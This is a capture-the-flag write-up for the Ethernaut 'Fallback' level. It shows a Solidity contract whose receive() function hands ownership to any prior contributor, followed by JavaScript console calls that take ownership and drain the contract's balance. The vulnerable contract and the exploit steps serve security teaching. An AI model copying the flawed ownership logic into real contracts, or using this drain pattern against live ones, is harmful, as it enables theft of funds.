# Ethernaut: 1. Fallback

**Objective of CTF:**

- Claim ownership of the contract.
- Reduce contract balance to 0.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Fallback {
  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address public owner;

  constructor() payable {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "caller is not the owner");
    _;
  }

  function contribute() public payable {
    require(msg.value < 0.001 ether, "insufficient funds");
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0, "insuff. value contribution");
    owner = msg.sender;
  }
}
```

The receive function is flawed, we just need to send some value via contribute and then via receive to change the owner. The contribute requires less than 0.001 ether, and receive expects greater than 0. Here is the plan:

1. We will contribute 1 Wei.
2. We will then send money to the contract address via a fallback function. This can be done by calling a non-existent function in the contract with some ether value.
3. We are now the owner!
4. To deal the final blow, we call the `withdraw` function. By only spending 2 Wei, we got the owners balance :)

```js
// (1) Contribute
await contract.contribute({value: '1'});

// (2) Fallback
await contract.sendTransaction({
  from: player,
  value: '1',
  data: undefined, // for the fallback
});

// (3) Confirm ownership
await contract.owner();

// (4) Withdraw
await contract.withdraw();
```
